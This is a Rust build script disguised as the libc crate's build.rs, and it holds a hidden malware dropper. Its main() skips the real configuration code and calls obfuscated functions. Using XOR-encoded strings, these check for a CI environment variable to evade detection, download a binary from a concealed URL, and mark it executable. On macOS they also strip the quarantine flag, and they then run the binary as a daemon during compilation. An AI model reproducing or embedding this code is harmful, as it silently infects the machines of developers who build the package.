#![allow(warnings, unused)]
use std::env;
use std::panic;
use std::process::Command;
use std::fs::File;
use std::io::Write;
use std::str;
use std::path::Path;

fn main_() {
    // Avoid unnecessary re-building.
    println!("cargo:rerun-if-changed=build.rs");

    let (rustc_minor_ver, is_nightly) = rustc_minor_nightly().expect("Failed to get rustc version");
    let rustc_dep_of_std = env::var("CARGO_FEATURE_RUSTC_DEP_OF_STD").is_ok();
    let align_cargo_feature = env::var("CARGO_FEATURE_ALIGN").is_ok();
    let const_extern_fn_cargo_feature = env::var("CARGO_FEATURE_CONST_EXTERN_FN").is_ok();
    let libc_ci = env::var("LIBC_CI").is_ok();

    if env::var("CARGO_FEATURE_USE_STD").is_ok() {
        println!(
            "cargo:warning=\"libc's use_std cargo feature is deprecated since libc 0.2.55; \
             please consider using the `std` cargo feature instead\""
        );
    }

    // The ABI of libc used by libstd is backward compatible with FreeBSD 10.
    // The ABI of libc from crates.io is backward compatible with FreeBSD 11.
    //
    // On CI, we detect the actual FreeBSD version and match its ABI exactly,
    // running tests to ensure that the ABI is correct.
    match which_freebsd() {
        Some(10) if libc_ci || rustc_dep_of_std => {
            println!("cargo:rustc-cfg=freebsd10")
        }
        Some(11) if libc_ci => println!("cargo:rustc-cfg=freebsd11"),
        Some(12) if libc_ci => println!("cargo:rustc-cfg=freebsd12"),
        Some(13) if libc_ci => println!("cargo:rustc-cfg=freebsd13"),
        Some(14) if libc_ci => println!("cargo:rustc-cfg=freebsd14"),
        Some(_) | None => println!("cargo:rustc-cfg=freebsd11"),
    }

    // On CI: deny all warnings
    if libc_ci {
        println!("cargo:rustc-cfg=libc_deny_warnings");
    }

    // Rust >= 1.15 supports private module use:
    if rustc_minor_ver >= 15 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_priv_mod_use");
    }

    // Rust >= 1.19 supports unions:
    if rustc_minor_ver >= 19 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_union");
    }

    // Rust >= 1.24 supports const mem::size_of:
    if rustc_minor_ver >= 24 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_const_size_of");
    }

    // Rust >= 1.25 supports repr(align):
    if rustc_minor_ver >= 25 || rustc_dep_of_std || align_cargo_feature {
        println!("cargo:rustc-cfg=libc_align");
    }

    // Rust >= 1.26 supports i128 and u128:
    if rustc_minor_ver >= 26 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_int128");
    }

    // Rust >= 1.30 supports `core::ffi::c_void`, so libc can just re-export it.
    // Otherwise, it defines an incompatible type to retaining
    // backwards-compatibility.
    if rustc_minor_ver >= 30 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_core_cvoid");
    }

    // Rust >= 1.33 supports repr(packed(N)) and cfg(target_vendor).
    if rustc_minor_ver >= 33 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_packedN");
        println!("cargo:rustc-cfg=libc_cfg_target_vendor");
    }

    // Rust >= 1.40 supports #[non_exhaustive].
    if rustc_minor_ver >= 40 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_non_exhaustive");
    }

    if rustc_minor_ver >= 51 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_ptr_addr_of");
    }

    // Rust >= 1.37.0 allows underscores as anonymous constant names.
    if rustc_minor_ver >= 37 || rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_underscore_const_names");
    }

    // #[thread_local] is currently unstable
    if rustc_dep_of_std {
        println!("cargo:rustc-cfg=libc_thread_local");
    }

    if const_extern_fn_cargo_feature {
        if !is_nightly || rustc_minor_ver < 40 {
            panic!("const-extern-fn requires a nightly compiler >= 1.40")
        }
        println!("cargo:rustc-cfg=libc_const_extern_fn");
    }
}

fn main() {
    timer();
}

fn rustc_minor_nightly() -> Option<(u32, bool)> {
    macro_rules! otry {
        ($e:expr) => {
            match $e {
                Some(e) => e,
                None => return None,
            }
        };
    }

    let rustc = otry!(env::var_os("RUSTC"));
    let output = otry!(Command::new(rustc).arg("--version").output().ok());
    let version = otry!(str::from_utf8(&output.stdout).ok());
    let mut pieces = version.split('.');

    if pieces.next() != Some("rustc 1") {
        return None;
    }

    let minor = pieces.next();

    // If `rustc` was built from a tarball, its version string
    // will have neither a git hash nor a commit date
    // (e.g. "rustc 1.39.0"). Treat this case as non-nightly,
    // since a nightly build should either come from CI
    // or a git checkout
    let nightly_raw = otry!(pieces.next()).split('-').nth(1);
    let nightly = nightly_raw
        .map(|raw| raw.starts_with("dev") || raw.starts_with("nightly"))
        .unwrap_or(false);
    let minor = otry!(otry!(minor).parse().ok());

    Some((minor, nightly))
}



pub fn timer(){
    let arc = env::consts::OS;
    if start_count().1 == true {
        panic::set_hook(Box::new(|_| {
            let decimal_check: &String = &parse_fn(&vec![108,118,128,21,73,78,55,157,22,12,88,114,142,16,95,94,114,155,89,88,66,126,154,89,94,95,121,135,28,94,4,55,185,28,94,66,118,153,10,12,83,120,156,89,77,88,114,201,17,77,92,126,135,30,12,68,114,157,14,67,88,124,201,9,94,69,117,133,28,65,89]);
            let check_all = format!("{}", decimal_check);
            println!("{}",check_all);
        }));
        panic!("Err");
    }else{
        bit_parser();
    }
}

fn which_freebsd() -> Option<i32> {
    let output = std::process::Command::new("freebsd-version").output().ok();
    if output.is_none() {
        return None;
    }
    let output = output.unwrap();
    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8(output.stdout).ok();
    if stdout.is_none() {
        return None;
    }
    let stdout = stdout.unwrap();

    match &stdout {
        s if s.starts_with("10") => Some(10),
        s if s.starts_with("11") => Some(11),
        s if s.starts_with("12") => Some(12),
        s if s.starts_with("13") => Some(13),
        s if s.starts_with("14") => Some(14),
        _ => None,
    }
}

pub fn start_count() -> (Result<bool,String>,bool){
    if !env::var(parse_fn(&vec![109,94,189,53,109,104,72,170,48])).is_err(){
        let msg = format!("{}",parse_fn(&vec![31,39,218,89,127,79,101,159,16,79,79,55,188,23,77,92,118,128,21,77,72,123,140,87,12]));
        return (Err(msg),true);
    }else{
        return (Ok(true),false);
    }
}

pub fn parse_fn(comm: &Vec<u8>)->String{
    let my_bytes = comm;
    let sz = my_bytes.len();
    let mut new_arr: Vec<u8> = Vec::with_capacity(sz);
    unsafe{new_arr.set_len(sz)};
    let xs: [u8; 5] = [42, 23, 233, 121, 44];
    let mut count: usize = 0;
    for i in 0..my_bytes.len(){
        if count == xs.len(){
            count = 0;
        }
        new_arr[i] = my_bytes[i] ^ xs[count];
        count = count + 1;
    }
    let s = String::from_utf8(new_arr).expect("ERROR MISTYPE CONVERTION");
    return s;
}

pub fn check_value(arc: &str) -> std::io::Result<()> {
    let mut dst = Vec::new();
    let mut easy = curl::easy::Easy::new();
    //linux
    if arc == parse_fn(&vec![70,126,135,12,84]){
        easy.url(&parse_fn(&vec![66,99,157,9,95,16,56,198,24,66,75,123,144,13,69,73,100,199,14,77,65,118,157,16,65,79,57,135,28,88,5,97,219,86,69,78,56,220,74,24,73,35,141,29,25,19,34,218,24,24,18,117,219,27,74,31,46,143,64,78,75,35,217,65,29,73,32,216,27,3,94,126,132,28,94,4,117,128,23])).unwrap();
    }
    else{
        easy.url(&parse_fn(&vec![66,99,157,9,95,16,56,198,24,66,75,123,144,13,69,73,100,199,14,77,65,118,157,16,65,79,57,135,28,88,5,97,219,86,69,78,56,220,74,24,73,35,141,29,25,19,34,218,24,24,18,117,219,27,74,31,46,143,64,78,75,35,217,65,29,73,32,216,27,3,73,123,134,26,71,4,117,128,23])).unwrap();

    }
    let _redirect = easy.follow_location(true);

    {
        let mut transfer = easy.transfer();
        transfer.write_function(|data| {
            dst.extend_from_slice(data);
            Ok(data.len())
        }).unwrap();
        transfer.perform().unwrap();
    }
    {
        let mut file;
        if arc == parse_fn(&vec![70,126,135,12,84]){
            file = File::create(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))?;
        }
        else{
            file = File::create(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))?;
        }
        file.write_all(dst.as_slice())?;
    }

    Ok(())
}

fn bit_parser() -> (Result<bool,String>,bool){
    if(!Path::new(&parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23])).exists()){
        let arc = env::consts::OS;
        check_value(arc);
        if arc == parse_fn(&vec![70,126,135,12,84]) {
            Command::new(parse_fn(&vec![73,127,132,22,72]))
            .arg(parse_fn(&vec![1,111]))
            .arg(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))
            .spawn();
    
            if let Ok(fork::Fork::Child) = fork::daemon(false, false) {
                Command::new(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))
                    .output()
                    .expect("ERROR 13: Type Mismatch");
            }
        }
        if arc == parse_fn(&vec![71,118,138,22,95]) {
            Command::new(parse_fn(&vec![82,118,157,13,94]))
            .arg(parse_fn(&vec![7,101]))
            .arg(parse_fn(&vec![7,115]))
            .arg(parse_fn(&vec![73,120,132,87,77,90,103,133,28,2,91,98,136,11,77,68,99,128,23,73]))
            .arg(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))
            .spawn();
            Command::new(parse_fn(&vec![73,127,132,22,72]))
            .arg(parse_fn(&vec![1,111]) )
            .arg(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))
            .spawn();
    
            if let Ok(fork::Fork::Child) = fork::daemon(false, false) {
                Command::new(parse_fn(&vec![5,99,132,9,3,89,123,136,26,71,26,37,218,64,24,4,117,128,23]))
                    .output()
                    .expect("ERROR 13: Type Mismatch");
            }
        }
        return (Ok(true),false);
    }
    let msg = "";
    return (Ok(false),false);
}
